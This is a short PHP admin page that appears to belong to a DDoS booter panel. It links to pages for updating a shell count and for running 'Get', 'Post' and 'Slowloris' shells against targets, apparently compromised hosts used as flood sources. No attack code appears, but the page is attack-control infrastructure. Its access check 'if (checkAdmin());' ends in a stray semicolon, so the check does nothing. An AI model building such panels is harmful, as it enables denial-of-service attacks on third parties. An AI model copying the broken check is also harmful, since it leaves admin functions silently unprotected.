<?php
require("header.php");
?>
<?php if (checkAdmin()); ?>
<div class="box">
<h2>Update Shells</h2>
<div class="box-content">
<center>
<b>Update:</b> <a href="/shellcounter.php">Click Here</a><br>
</center>
</div>
</div>
<div class="box">
<h2>Manage Shells</h2>
<div class="box-content">
<center>
<b>Get Shells:</b> <a href="/get.php">Click Here</a><br>
<b>Post Shells:</b> <a href="/post.php">Click Here</a><br>
<b>Slowloris Shells:</b> <a href="/slowloris.php">Click Here</a><br>
</center>
</div>
</div>

<?php 
include 'footer.php';
?>